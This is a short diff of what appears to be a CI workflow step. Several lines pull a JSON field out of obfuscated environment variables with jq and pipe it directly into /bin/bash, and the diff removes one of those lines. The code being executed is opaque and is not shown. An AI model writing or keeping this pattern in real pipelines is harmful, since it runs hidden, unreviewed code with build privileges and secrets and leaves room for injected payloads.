@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$jrzm019" | jq -r .lcnma5 | /bin/bash
           printf '%s' "$ii92" | jq -r .dxdw82 | /bin/bash
-          echo $un7699 | jq -r .blty85 | /bin/bash
           printf '%s' "$urolq13452" | jq -r .mfp44 | /bin/bash
 
       - name: Save results
